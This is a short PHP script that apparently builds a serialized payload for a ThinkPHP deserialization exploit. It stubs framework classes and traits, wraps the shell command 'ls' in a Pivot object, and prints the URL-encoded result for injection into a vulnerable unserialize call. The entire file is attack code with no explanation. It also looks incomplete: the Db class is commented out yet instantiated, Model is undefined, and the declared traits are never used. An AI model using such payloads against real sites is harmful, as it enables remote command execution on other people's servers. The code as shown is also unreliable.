<?php
// namespace think{
//     class Db{

//     }
// }
namespace think\model\concern {
    trait Conversion{
        protected $visible;
    }

    trait RelationShip{
        private $relation;
    }

    trait Attribute{
        private $withAttr;
        private $data;
    }
}

namespace think{
    class DbManager{

    }

}



namespace think\model{
    class Pivot extends \think\Model{
        public function __construct($data,$obj)
        {
            parent::__construct($data,$obj);
        }
    }
}

namespace{
    $db = new \think\Db();
    $pivot2 = new think\model\Pivot(['paper'=>'ls'],$db);
    echo urlencode(serialize($pivot2));
}